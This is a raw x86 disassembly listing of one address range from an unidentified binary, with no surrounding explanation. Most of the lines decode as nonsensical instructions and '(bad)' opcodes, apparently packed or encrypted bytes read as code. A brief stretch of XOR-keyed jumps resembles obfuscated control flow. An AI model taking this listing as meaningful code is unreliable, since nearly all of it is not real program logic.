  40a95a:	jb     0x40a9c3
  40a95c:	lahf   
  40a95d:	popa   
  40a95e:	neg    ebp
  40a960:	ja     0x40a90c
  40a962:	dec    esi
  40a963:	into   
  40a964:	push   es
  40a965:	jo     0x40a92d
  40a967:	cld    
  40a968:	retf   
  40a969:	pop    esi
  40a96a:	pushf  
  40a96b:	adc    BYTE PTR [ebx],0x4b
  40a96e:	mov    edi,DWORD PTR [eax+ebp*8-0x3e]
  40a972:	out    dx,eax
  40a973:	inc    eax
  40a974:	ret    
  40a975:	out    0x48,al
  40a977:	push   edi
  40a978:	cmp    eax,0x867a40e9
  40a97d:	lahf   
  40a97e:	arpl   WORD PTR [eax+ebx*2-0x5ebc28ea],si
  40a985:	xor    DWORD PTR [edx],edi
  40a987:	loope  0x40a9cd
  40a989:	aad    0xf2
  40a98b:	shr    BYTE PTR [esi+0x7c],cl
  40a98e:	ss jp  0x40a92c
  40a991:	push   ss
  40a992:	jmp    0xb48f:0x489833d0
  40a999:	add    dh,al
  40a99b:	xchg   ebx,eax
  40a99c:	adc    bl,dl
  40a99e:	mov    WORD PTR [edx-0x1f15797f],ds
  40a9a4:	mov    eax,0xbb883e94
  40a9a9:	push   ebx
  40a9aa:	mov    bl,0xe5
  40a9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ad:	test   al,0x7e
  40a9af:	mov    WORD PTR ds:0x3b16547a,ss
  40a9b5:	aaa    
  40a9b6:	outs   dx,BYTE PTR ds:[esi]
  40a9b7:	(bad)  
  40a9b8:	mov    ds:0xeb36fd2,al
  40a9bd:	out    0xb3,al
  40a9bf:	dec    ecx
  40a9c0:	sub    ebp,DWORD PTR [edi-0x39313b0]
  40a9c6:	pop    ss
  40a9c7:	adc    bh,BYTE PTR [ecx+eiz*8+0x66192195]
  40a9ce:	xchg   esp,eax
  40a9cf:	dec    esi
  40a9d0:	jno    0x40a9c7
  40a9d2:	adc    BYTE PTR [ebx+ebx*4-0x16],bh
  40a9d6:	inc    eax
  40a9d7:	fucomp st(7)
  40a9d9:	je     0x40aa01
  40a9db:	bound  edx,QWORD PTR [esi]
  40a9dd:	cwde   
  40a9de:	jae    0x40a9ee
  40a9e0:	ds loop 0x40a995
  40a9e3:	sbb    BYTE PTR [edi-0x7a345a6d],al
  40a9e9:	pop    eax
  40a9ea:	imul   ebp,DWORD PTR [esi+ecx*2+0x67aa73ba],0xb4fa470d
  40a9f5:	scas   al,BYTE PTR es:[edi]
  40a9f6:	enter  0xbe5f,0xe1
  40a9fa:	xchg   esi,eax
  40a9fb:	bound  esp,QWORD PTR ds:0xd06cb120
  40aa01:	mov    eax,0xba3e6159
  40aa06:	xchg   ebp,eax
  40aa07:	ret    
  40aa08:	cmp    eax,0x377e642c
  40aa0d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40aa0f:	push   eax
  40aa10:	mov    al,ds:0x1e89488f
  40aa15:	ins    DWORD PTR es:[edi],dx
  40aa16:	xlat   BYTE PTR ds:[ebx]
  40aa17:	push   ds
  40aa18:	mov    ds:0x99ac81dd,eax
  40aa1d:	rcr    BYTE PTR [ebp+0x26ae7ec5],cl
  40aa23:	sub    al,0xf8
  40aa25:	push   esp
  40aa26:	push   cs
  40aa27:	xor    DWORD PTR [ebx-0x20],edx
  40aa2a:	fdiv   DWORD PTR [esi]
  40aa2c:	sbb    eax,0xa44295
  40aa31:	dec    esp
  40aa32:	(bad)  
  40aa33:	sbb    BYTE PTR ds:0x5ec735cf,bl
  40aa39:	mov    WORD PTR [ebx+edx*2+0x14],ss
  40aa3d:	mov    WORD PTR [ecx+edi*1+0x948c4d5],gs
  40aa44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa45:	jns    0x40a9f7
  40aa47:	dec    ebx
  40aa48:	or     eax,0x6712059b
  40aa4d:	rol    ecx,0x69
  40aa50:	dec    ebp
  40aa51:	sbb    eax,0x2b9562e0
  40aa56:	nop
  40aa57:	repz inc ecx
  40aa59:	sub    al,0x5e
  40aa5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa5c:	xchg   edx,eax
  40aa5d:	or     esp,DWORD PTR [esi]
  40aa5f:	jl     0x40aa50
  40aa61:	in     eax,0x18
  40aa63:	out    dx,eax
  40aa64:	push   es
  40aa65:	sub    ch,BYTE PTR [edi-0x6431fb1d]
  40aa6b:	dec    esp
  40aa6c:	xor    edi,esp
  40aa6e:	es jmp 0xb7afe24e
  40aa74:	lahf   
  40aa75:	cmp    ebx,DWORD PTR [eax]
  40aa77:	adc    al,0xa
  40aa79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7a:	sbb    eax,0x5f1346ed
  40aa7f:	call   0x1e6822a
  40aa84:	xchg   ebp,eax
  40aa85:	jb     0x40aa6d
  40aa87:	jne    0x40aa90
  40aa89:	mov    DWORD PTR ds:0x5f56c0ad,ebx
  40aa8f:	inc    ebp
  40aa90:	and    eax,DWORD PTR [eax-0x56]
  40aa93:	sbb    dh,BYTE PTR [eax+0x34]
  40aa96:	imul   edi,DWORD PTR [ebp-0x17a88d59],0x19051657
  40aaa0:	jbe    0x40aa73
  40aaa2:	inc    esp
  40aaa3:	jo     0x40ab08
  40aaa5:	lock clc 
  40aaa7:	cmp    edx,ebx
  40aaa9:	(bad)  
  40aaaa:	lods   eax,DWORD PTR ds:[esi]
  40aaab:	std    
  40aaac:	jmp    0x40aa6f
  40aaae:	popf   
  40aaaf:	pop    esp
  40aab0:	xchg   edx,eax
  40aab1:	dec    edi
  40aab2:	push   esi
  40aab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab4:	sbb    DWORD PTR ds:0x4ff3f035,eax
  40aaba:	add    ecx,DWORD PTR [ecx]
  40aabc:	push   ecx
  40aabd:	jne    0x40aae1
  40aabf:	enter  0x16c8,0xf2
  40aac3:	pop    ebp
  40aac4:	call   0x84164cc9
  40aac9:	push   es
  40aaca:	fs jle 0x40aa79
  40aacd:	stos   DWORD PTR es:[edi],eax
  40aace:	pusha  
  40aacf:	fs jnp 0x40aa8e
  40aad2:	shl    BYTE PTR [ecx+0x5],0x22
  40aad6:	xchg   esp,eax
  40aad7:	ds jb  0x40ab51
  40aada:	jp     0x40aade
  40aadc:	sbb    DWORD PTR [ebp+0x35127dfd],edi
  40aae2:	sbb    cl,0x25
  40aae5:	fstp   QWORD PTR [ebp+0x22a47297]
  40aaeb:	sbb    al,0x88
  40aaed:	xchg   ecx,eax
  40aaee:	fild   DWORD PTR [ecx]
  40aaf0:	mov    ah,0x50
  40aaf2:	mov    dl,dl
  40aaf4:	xchg   esp,eax
  40aaf5:	and    al,BYTE PTR [ebx+edx*1]
  40aaf8:	lds    esp,FWORD PTR [ecx+0x56]
  40aafb:	jmp    FWORD PTR [eax]
  40aafd:	mov    DWORD PTR [esp+eax*4-0x7d],edi
  40ab01:	nop
  40ab02:	cmp    al,0x9
  40ab04:	xchg   ebp,eax
  40ab05:	lods   eax,DWORD PTR ds:[esi]
  40ab06:	out    dx,eax
  40ab07:	mov    al,0x23
  40ab09:	pop    ecx
  40ab0a:	pop    ebx
  40ab0b:	jbe    0x40aaef
  40ab0d:	cmp    ebx,edx
  40ab0f:	add    DWORD PTR [ecx+0x2ed1ad7f],0x4d
  40ab16:	mov    BYTE PTR [edi-0x62],cl
  40ab19:	outs   dx,BYTE PTR ds:[esi]
  40ab1a:	cwde   
  40ab1b:	mov    ecx,0x61c623d5
  40ab20:	jns    0x40ab5a
  40ab22:	dec    esp
  40ab23:	les    edi,FWORD PTR [edx-0x77]
  40ab26:	(bad)  
  40ab27:	(bad)  
  40ab28:	push   ds
  40ab29:	sub    BYTE PTR [edi-0x6a],dh
  40ab2c:	popf   
  40ab2d:	and    al,0xd8
  40ab2f:	arpl   WORD PTR [esi],bp
  40ab31:	mov    bh,0x3d
  40ab33:	ret    
  40ab34:	addr16 cmp al,0x65
  40ab37:	(bad)  
  40ab38:	or     cl,ah
  40ab3a:	inc    ebp
  40ab3b:	or     DWORD PTR [esi],esp
  40ab3d:	popf   
  40ab3e:	ficom  DWORD PTR [eax-0x80]
  40ab41:	adc    DWORD PTR [esi],eax
  40ab43:	fidiv  DWORD PTR [ebx+0x3461999c]
  40ab49:	ret    0xa46f
  40ab4c:	sub    DWORD PTR [edx],0xffffffb1
  40ab4f:	cmc    
  40ab50:	sar    DWORD PTR [edx+0x7fe53d50],1
  40ab56:	sbb    DWORD PTR [ebx+0x76c4f8b0],esi
  40ab5c:	inc    esi
  40ab5d:	in     eax,dx
  40ab5e:	arpl   WORD PTR [edi+0x19],bp
  40ab61:	shl    DWORD PTR [ebx+0x1b],cl
  40ab64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab65:	stos   DWORD PTR es:[edi],eax
  40ab66:	fdiv   DWORD PTR [eax]
  40ab68:	lahf   
  40ab69:	cld    
  40ab6a:	mov    bh,0xe0
  40ab6c:	out    dx,eax
  40ab6d:	mov    DWORD PTR [ebx+0x5ebda6e6],esi
  40ab73:	and    DWORD PTR [eax-0x27],esi
  40ab76:	(bad)  
  40ab77:	mov    ds:0xc846ee89,al
  40ab7c:	loope  0x40ab27
  40ab7e:	jl     0x40abe8
  40ab80:	imul   edx,DWORD PTR [esi-0x42737704],0xffffffe9
  40ab87:	outs   dx,DWORD PTR ds:[esi]
  40ab88:	sbb    al,0xf1
  40ab8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab8b:	(bad)  
  40ab8c:	outs   dx,DWORD PTR ds:[esi]
  40ab8d:	fldcw  WORD PTR [ebx+edx*1-0x67359248]
  40ab94:	lahf   
  40ab95:	fimul  DWORD PTR [edx+0x14ed46b7]
  40ab9b:	ror    BYTE PTR [esi+0x66],1
  40ab9e:	mov    ah,0x38
  40aba0:	adc    ecx,DWORD PTR [eax+0x4a9d1177]
  40aba6:	add    ebx,DWORD PTR [ecx+0x48]
  40aba9:	mov    ch,0x6e
  40abab:	imul   ebp,DWORD PTR [ebp-0x68766e45],0x8cf5d636
  40abb5:	adc    BYTE PTR [edi],al
  40abb7:	jp     0x40ab95
  40abb9:	sti    
  40abba:	ss adc ebx,esp
  40abbd:	lds    edx,FWORD PTR [ebp+0xc]
  40abc0:	and    BYTE PTR ds:0x26880c19,ch
  40abc6:	out    0x70,eax
  40abc8:	push   0x69
  40abca:	stos   DWORD PTR es:[edi],eax
  40abcb:	bound  ebp,QWORD PTR [esi-0xa]
  40abce:	leave  
  40abcf:	test   BYTE PTR [eax-0x5de96774],0x89
  40abd6:	mov    ?,esp
  40abd8:	jmp    0x40ac27
  40abda:	dec    edi
  40abdb:	std    
  40abdc:	jmp    0x20cc:0x8af3d780
  40abe3:	call   0x3544:0x272000b5
  40abea:	ds jns 0x40ab93
  40abed:	cmp    al,0xf9
  40abef:	out    dx,eax
  40abf0:	clc    
  40abf1:	cwde   
  40abf2:	xchg   ebp,eax
  40abf3:	jmp    0x9cc870a2
  40abf8:	and    dh,BYTE PTR [ecx+ebp*2+0x49]
  40abfc:	dec    ecx
  40abfd:	loop   0x40ac1e
  40abff:	mov    al,0xb1
  40ac01:	xchg   esi,eax
  40ac02:	pusha  
  40ac03:	xchg   edx,eax
  40ac04:	or     DWORD PTR [ecx+ebx*1+0x6c079006],ebx
  40ac0b:	rcl    DWORD PTR [ebp-0x3cca912c],1
  40ac11:	ror    bh,1
  40ac13:	or     bl,bl
  40ac15:	jmp    0x5f43:0xcd04c525
  40ac1c:	sbb    edi,esi
  40ac1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac1f:	mov    al,ds:0xe8897492
  40ac24:	into   
  40ac25:	mov    ss,WORD PTR [esi+0x7b48e92a]
  40ac2b:	inc    eax
  40ac2c:	ins    DWORD PTR es:[edi],dx
  40ac2d:	mov    edi,0xe4606c00
  40ac32:	or     edx,DWORD PTR [ebx]
  40ac34:	jne    0x40ac79
  40ac36:	aas    
  40ac37:	dec    esi
  40ac38:	sahf   
  40ac39:	pop    ebx
  40ac3a:	jg     0x40ac13
  40ac3c:	lea    edi,[esi-0x2be5ef4a]
  40ac42:	sub    eax,0x29423005
  40ac47:	jnp    0x40abff
  40ac49:	jnp    0x40ac44
  40ac4b:	icebp  
  40ac4c:	push   0x72
  40ac4e:	repz add ebp,esi
  40ac51:	mov    al,ds:0xde26ed09
  40ac56:	xor    dh,BYTE PTR [esi+0x4ceae7fd]
  40ac5c:	push   ebx
  40ac5d:	fcomp  DWORD PTR [ecx-0x25]
  40ac60:	inc    ecx
  40ac62:	adc    DWORD PTR [edi],edi
  40ac64:	xchg   esp,eax
  40ac65:	(bad)  
  40ac66:	(bad)  
  40ac67:	mov    esp,0xbe990b79
  40ac6c:	cld    
  40ac6d:	dec    eax
  40ac6e:	push   0x74
  40ac70:	dec    eax
  40ac71:	rcr    BYTE PTR [edx],1
  40ac73:	jecxz  0x40ac71
  40ac75:	add    al,0x3f
  40ac77:	rol    BYTE PTR [ebx+ecx*4-0x739158ea],0x36
  40ac7f:	mov    bh,0x66
  40ac81:	xchg   esp,eax
  40ac82:	aad    0x15
  40ac84:	mov    ebx,0xde60394e
  40ac89:	mov    ecx,0xb206f049
  40ac8e:	mov    al,ds:0x1b0ec066
  40ac93:	dec    esp
  40ac94:	xor    dl,BYTE PTR [ebx]
  40ac96:	pop    ecx
  40ac97:	adc    eax,0x92069a3d
  40ac9c:	cmc    
  40ac9d:	mov    edi,0x9f78689f
  40aca2:	(bad)  
  40aca3:	out    0x33,eax
  40aca5:	mov    WORD PTR ds:0x76aeb5de,gs
  40acab:	dec    edx
  40acac:	add    BYTE PTR ds:0x257aa544,cl
  40acb2:	and    al,0x8a
  40acb4:	cmp    esi,esp
  40acb6:	in     eax,0xc1
  40acb8:	(bad)  
  40acb9:	jmp    0x6949:0xb03cfb2e
  40acc0:	xchg   ebp,eax
  40acc1:	mov    esi,0x201cb7b5
  40acc6:	popa   
  40acc7:	xchg   ebx,eax
  40acc8:	js     0x40acf0
  40acca:	mov    ecx,0x7b4b8a16
  40accf:	aad    0x80
  40acd1:	scas   eax,DWORD PTR es:[edi]
  40acd2:	push   ds
  40acd3:	pop    ebp
  40acd4:	adc    DWORD PTR [ebx],ecx
  40acd6:	inc    esi
  40acd7:	fisttp QWORD PTR [edi+edx*4]
  40acda:	xor    al,0x6
  40acdc:	pop    ebp
  40acdd:	dec    edi
  40acde:	xor    al,0x31
  40ace0:	jmp    0x8540:0x36e0d7a0
  40ace7:	popf   
  40ace8:	(bad)  
  40acea:	or     esp,0x8d54ad46
  40acf0:	mov    esi,0x7c2581e6
  40acf5:	mov    ss,WORD PTR [eax-0x4a1f581a]
  40acfb:	cmp    esp,ebx
  40acfd:	and    al,0x12
  40acff:	xchg   esp,eax
  40ad00:	jmp    0x40ad34
  40ad02:	push   ss
  40ad03:	cmp    al,0xa8
  40ad05:	gs popa 
  40ad07:	push   ebp
  40ad08:	mov    ah,BYTE PTR [esi+ebx*4+0x2ad3761f]
  40ad0f:	call   0xf87a1c1f
  40ad14:	fiadd  WORD PTR [ebx+0x4990a96b]
  40ad1a:	(bad)  
  40ad1b:	adc    BYTE PTR [ebx+0x56],bh
  40ad1e:	mov    ds:0x7ce20d6f,eax
  40ad23:	in     al,0x96
  40ad25:	(bad)  [ecx]
  40ad27:	aam    0x39
  40ad29:	ret    
  40ad2a:	sub    esi,esp
  40ad2c:	sbb    bl,BYTE PTR [ecx-0x200e1d94]
  40ad32:	test   DWORD PTR [esi],0x8ec6728c
  40ad38:	cli    
  40ad39:	inc    esi
  40ad3a:	div    DWORD PTR [esi-0x2df5534c]
  40ad40:	ret    
  40ad41:	mov    eax,ds:0xefa7372a
  40ad46:	js     0x40adb7
  40ad48:	pop    ecx
  40ad49:	mov    ch,0x94
  40ad4b:	jne    0x40ad32
  40ad4d:	adc    BYTE PTR [ebx],0x91
  40ad50:	adc    edx,eax
  40ad52:	dec    esp
  40ad53:	cwde   
  40ad54:	mov    dh,0xd3
  40ad56:	cwde   
  40ad57:	test   al,0x55
  40ad59:	mov    bl,0x94
  40ad5b:	sbb    BYTE PTR [ebx+ecx*1],cl
  40ad5e:	sahf   
  40ad5f:	sbb    al,0xef
  40ad61:	sub    ah,bh
  40ad63:	outs   dx,DWORD PTR ds:[esi]
  40ad64:	mov    gs,WORD PTR ds:0x2acd8324
  40ad6a:	mov    bh,0x55
  40ad6c:	stos   BYTE PTR es:[edi],al
  40ad6d:	or     dh,BYTE PTR [edi-0x80]
  40ad70:	xor    ah,ch
  40ad72:	dec    ebp
  40ad73:	mov    ds:0xfbcb7935,al
  40ad78:	push   edi
  40ad79:	(bad)  
  40ad7a:	cmp    eax,0xe1c2ccf6
  40ad7f:	mov    al,ds:0x96f56a4c
  40ad84:	or     al,0x97
  40ad86:	aad    0x67
  40ad88:	in     eax,dx
  40ad89:	ins    BYTE PTR es:[edi],dx
  40ad8a:	dec    edx
  40ad8b:	nop
  40ad8c:	retf   0x568b
  40ad8f:	jb     0x40ae03
  40ad91:	repz or al,0xc0
  40ad94:	xchg   ebx,eax
  40ad95:	inc    esi
  40ad96:	test   ah,dh
  40ad98:	sub    BYTE PTR [esi],bh
  40ad9a:	pop    edi
  40ad9b:	xchg   esi,eax
  40ad9c:	sub    DWORD PTR [edx-0x32c1918d],0x8a7cd388
  40ada6:	jmp    0xae0e:0x61ef6aec
  40adad:	jmp    0xaab2e2c1
  40adb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb3:	mov    esp,0xd43d356
  40adb8:	outs   dx,DWORD PTR ds:[esi]
  40adb9:	retf   
  40adba:	ror    DWORD PTR [ebx],1
  40adbc:	(bad)  
  40adbd:	not    DWORD PTR ss:[edi+0x6b939147]
  40adc4:	push   ebx
  40adc5:	in     eax,dx
  40adc6:	or     eax,edx
  40adc8:	in     al,0x1c
  40adca:	pop    es
  40adcb:	sub    BYTE PTR [eax-0x68b5d5c4],ah
  40add1:	jmp    0xbe71b250
  40add6:	xor    eax,0x547f8e0
  40addb:	mov    ds,eax
  40addd:	cmp    eax,0x5ada2ddc
  40ade2:	inc    esi
  40ade3:	dec    ebp
  40ade4:	das    
  40ade5:	int3   
  40ade6:	mov    edi,0x48f3be3
  40adeb:	stc    
  40adec:	loope  0x40ae33
  40adee:	sub    dl,bh
  40adf0:	mov    edi,0xfa4c1e13
  40adf5:	jl     0x40ae1f
  40adf7:	mov    cl,0xea
  40adf9:	adc    dh,dl
  40adfb:	adc    BYTE PTR [esi+0x103fa953],bh
  40ae01:	stos   BYTE PTR es:[edi],al
  40ae02:	fisub  WORD PTR [edi-0x36d2b687]
  40ae08:	mov    BYTE PTR [ecx+0x2c707d81],0x9c
  40ae0f:	out    dx,eax
  40ae10:	pushf  
  40ae11:	pop    ebp
  40ae12:	jns    0x40ad97
  40ae14:	xor    al,0xf3
  40ae16:	and    esp,DWORD PTR [eax-0x14]
  40ae19:	jmp    0xac9a:0xd970d3eb
  40ae20:	ins    DWORD PTR es:[edi],dx
  40ae21:	stos   BYTE PTR es:[edi],al
  40ae22:	sbb    DWORD PTR [ebx+ebp*2+0x1e],0xffffffad
  40ae27:	es loopne 0x40adab
  40ae2a:	xor    DWORD PTR [edi+0x130de074],ebp
  40ae30:	and    eax,DWORD PTR [edi]
  40ae32:	cs in  al,0xbb
  40ae35:	scas   eax,DWORD PTR es:[edi]
  40ae36:	cvtps2pd xmm7,xmm5
  40ae39:	pop    esp
  40ae3a:	daa    
  40ae3b:	cmp    edi,edi
  40ae3d:	xchg   BYTE PTR [edi+ecx*1],cl
  40ae40:	xchg   esp,eax
  40ae41:	pusha  
  40ae42:	neg    BYTE PTR [edx+0x73]
  40ae45:	xor    ebp,ecx
  40ae47:	adc    DWORD PTR [edx-0x34],0x19dde12b
  40ae4e:	fisttp WORD PTR [edi]
  40ae50:	xchg   esi,eax
  40ae51:	push   ecx
  40ae52:	jge    0x40ae89
  40ae54:	cmc    
  40ae55:	mov    eax,ds:0x6dcfe440
  40ae5a:	jp     0x40adf5
  40ae5c:	push   0x1bd8b0b2
  40ae61:	adc    ch,cl
  40ae63:	in     eax,dx
  40ae64:	sbb    DWORD PTR [edx-0x4e572c0e],0xfe28c07e
  40ae6e:	in     eax,0x5f
  40ae70:	inc    eax
  40ae71:	jge    0x40ae81
  40ae73:	cmp    DWORD PTR [eax],ebp
  40ae75:	mov    ah,0x88
  40ae77:	xchg   edi,eax
  40ae78:	(bad)  
  40ae79:	test   al,0xd4
  40ae7b:	(bad)  
  40ae7c:	fidivr DWORD PTR [ebp+0x509acec9]
  40ae82:	mul    BYTE PTR [edx]
  40ae84:	repnz sub bl,BYTE PTR [ebp-0x5013225f]
  40ae8b:	mov    bh,0xdd
  40ae8d:	adc    bl,BYTE PTR [esp+eax*8]
  40ae90:	mov    ecx,0x4e385a2d
  40ae95:	add    ebp,DWORD PTR [esi-0x64]
  40ae98:	fsub   DWORD PTR [eax+0x6dbd50ab]
  40ae9e:	mov    al,ds:0x4b961541
  40aea3:	std    
  40aea4:	mov    esp,0x9ea11fad
  40aea9:	push   eax
  40aeaa:	adc    cl,BYTE PTR [edi]
  40aeac:	mov    bh,0x4
  40aeae:	pop    eax
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x2d5a730],al
  40aef6:	cdq    
  40aef7:	fiadd  WORD PTR [edx+0x137b7b09]
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	dec    esp
  40af01:	push   ds
  40af02:	cdq    
  40af03:	(bad)  
  40af04:	ds inc edx
  40af06:	call   0x2c394a6a
  40af0b:	fld    TBYTE PTR [edx]
  40af0d:	jmp    DWORD PTR [edx-0x12757bb9]
  40af13:	sbb    eax,0xeaa39b14
  40af18:	scas   al,BYTE PTR es:[edi]
  40af19:	stc    
  40af1a:	xor    al,0xdf
  40af1c:	dec    ebp
  40af1d:	test   ebx,edi
  40af1f:	sub    edx,ecx
  40af21:	fisttp WORD PTR [ebx]
  40af23:	ss cs daa 
  40af26:	jp     0x40af69
  40af28:	fidiv  DWORD PTR [edi]
  40af2a:	xchg   ebx,esp
  40af2c:	jne    0x40aed3
  40af2e:	dec    edi
  40af2f:	ds sbb eax,0xfaf9159a
  40af35:	test   BYTE PTR [eax-0x5c],ch
  40af38:	in     al,0xfb
  40af3a:	ret    
  40af3b:	fdivr  st(7),st
  40af3d:	mov    esi,0x9a7d7823
  40af42:	mov    al,0x26
  40af44:	sub    ebx,DWORD PTR [edx+0x4ca661d4]
  40af4a:	jne    0x40af9c
  40af4c:	jnp    0x40afc0
  40af4e:	in     eax,0x3d
  40af50:	fisub  WORD PTR [ecx+edi*8+0x35]
  40af54:	outs   dx,BYTE PTR ds:[esi]
  40af55:	xchg   BYTE PTR [edx],ah
  40af57:	mov    ecx,0xb3e29577
  40af5c:	call   0xa9d07ab9
  40af61:	pop    es
  40af62:	jbe    0x40af4f
  40af64:	push   0x44
  40af66:	adc    al,0x10
  40af68:	leave  
  40af69:	ja     0x40afcd
  40af6b:	ret    0x10f0
  40af6e:	ss pushf 
  40af70:	mov    esp,0xa4d4a7db
  40af75:	xchg   ecx,eax
  40af76:	jae    0x40af98
  40af78:	ja     0x40af65
  40af7a:	lds    esi,FWORD PTR [esi-0x498f7cc9]
  40af80:	mov    ?,edi
  40af82:	(bad)  
  40af83:	fwait
  40af84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af86:	mov    dl,0x8f
  40af88:	cmp    DWORD PTR [ebx+0x36],ebp
  40af8b:	pop    ds
  40af8c:	or     edi,DWORD PTR [edi]
  40af8e:	inc    ecx
  40af8f:	jb     0x40af98
  40af91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af92:	outs   dx,BYTE PTR ds:[esi]
  40af93:	xchg   edi,eax
  40af94:	nop
  40af95:	mov    dl,0x4
  40af97:	pop    ecx
  40af98:	mov    esp,0x4e8641
  40af9d:	je     0x40b003
  40af9f:	repz scas eax,DWORD PTR es:[edi]
  40afa1:	stos   DWORD PTR es:[edi],eax
  40afa2:	aam    0xb7
  40afa4:	fst    st(4)
  40afa6:	push   ss
  40afa7:	pop    esi
  40afa8:	jmp    0xba7ee040
  40afad:	out    dx,al
  40afae:	imul   esp,DWORD PTR [esi],0xf481eec9
  40afb4:	fiadd  DWORD PTR [ecx]
  40afb6:	out    0x68,al
  40afb8:	mov    ds:0x6543e9ec,al
  40afbd:	call   0x36023dd
  40afc2:	and    DWORD PTR [edi+0x4b],ebx
  40afc5:	scas   al,BYTE PTR es:[edi]
  40afc6:	dec    eax
  40afc7:	aam    0x48
  40afc9:	addr16 jp 0x40b044
  40afcc:	mov    esi,DWORD PTR [ebp+0x2ad3cb16]
  40afd2:	and    dh,BYTE PTR [ebp-0x758f6f41]
  40afd8:	xchg   edx,eax
  40afd9:	loope  0x40afa6
  40afdb:	into   
  40afdc:	mov    al,ds:0xc50d9b29
  40afe1:	mov    ebx,fs
  40afe3:	in     al,dx
  40afe4:	dec    ebx
  40afe5:	adc    DWORD PTR [ebp+0x606b81ff],0x8519d59d
  40afef:	add    al,dl
  40aff1:	and    eax,ebx
  40aff3:	fiadd  DWORD PTR [eax+eax*2-0x21]
  40aff7:	or     DWORD PTR [ebx],esi
  40aff9:	fcomp  QWORD PTR [edi-0xa]
  40affc:	iret   
  40affd:	adc    eax,0x6ffd6d44
  40b002:	cmp    cl,BYTE PTR [ecx-0x1fdf52bf]
  40b008:	inc    edi
  40b009:	dec    esp
  40b00a:	outs   dx,BYTE PTR ds:[esi]
  40b00b:	popa   
  40b00c:	sbb    ecx,DWORD PTR [edx]
  40b00e:	js     0x40b062
  40b010:	push   0x2f0a981f
  40b015:	inc    esi
  40b016:	push   ds
  40b017:	fadd   QWORD PTR [edi]
  40b019:	outs   dx,DWORD PTR ds:[esi]
  40b01a:	rcr    DWORD PTR [edx-0x60],cl
  40b01d:	push   esi
  40b01e:	mov    WORD PTR [ecx-0x797a26e3],ds
  40b024:	(bad)  
  40b025:	sahf   
  40b026:	or     al,BYTE PTR [eax+0x113152e0]
  40b02c:	dec    di
  40b02e:	stos   DWORD PTR es:[edi],eax
  40b02f:	xchg   ebp,eax
  40b030:	lock mov edx,DWORD PTR [edi+0x31]
  40b034:	leave  
  40b035:	daa    
  40b036:	jno    0x40b0a8
  40b038:	daa    
  40b039:	fdiv   DWORD PTR [esi*1-0x6d064cda]
  40b040:	sahf   
  40b041:	xchg   edx,eax
  40b042:	in     al,0x56
  40b044:	dec    edx
  40b045:	dec    ebx
  40b046:	dec    edi
  40b047:	pop    esp
  40b048:	out    0x12,al
  40b04a:	test   BYTE PTR [ecx-0x5a],dl
  40b04d:	lods   eax,DWORD PTR ds:[esi]
  40b04e:	(bad)  
  40b04f:	out    dx,al
  40b050:	int    0x6b
  40b052:	add    eax,0x1f7e3f1a
  40b057:	mov    ebx,DWORD PTR [eax-0x3f]
  40b05a:	xor    BYTE PTR [edi-0x32354b82],ah
  40b060:	bound  edi,QWORD PTR [esi-0x3777f04b]
  40b066:	mov    ebp,0x5ca427b4
  40b06b:	lods   al,BYTE PTR ds:[esi]
  40b06c:	imul   esp,DWORD PTR [edx+0x42],0x67
  40b070:	or     edi,DWORD PTR [ebx-0xccd3fa5]
  40b076:	mov    ds:0x93974d1f,eax
  40b07b:	xchg   ecx,eax
  40b07c:	test   al,0x6f
  40b07e:	cmp    edi,DWORD PTR [esi+0x44ef7b9c]
  40b084:	enter  0x554d,0x8d
  40b088:	mov    ds:0xd8c94c67,al
  40b08d:	arpl   WORD PTR [ebp+0x61],dx
  40b090:	stos   DWORD PTR es:[edi],eax
  40b091:	lahf   
  40b092:	dec    esp
  40b093:	sbb    BYTE PTR [ebx+0x62],ch
  40b096:	jns    0x40b042
  40b098:	leave  
  40b099:	mov    ?,esi
  40b09b:	in     eax,dx
  40b09c:	jns    0x40b11b
  40b09e:	xchg   edi,eax
  40b09f:	add    al,BYTE PTR [ecx+edx*8]
  40b0a2:	clc    
  40b0a3:	ss and ecx,ecx
  40b0a6:	jg     0x40b100
  40b0a8:	cmp    al,0xdd
  40b0aa:	cmp    al,0xf9
  40b0ac:	test   al,0xb3
  40b0ae:	ins    DWORD PTR es:[edi],dx
  40b0af:	push   eax
  40b0b0:	lea    ebx,[ecx-0x43]
  40b0b3:	(bad)  
  40b0b4:	bnd jp 0x40b125
  40b0b7:	mov    ds:0x5648794b,eax
  40b0bc:	bound  ebx,QWORD PTR [edx+0x3a2d63fc]
  40b0c2:	pushfw 
  40b0c4:	cwde   
  40b0c5:	popa   
  40b0c6:	cli    
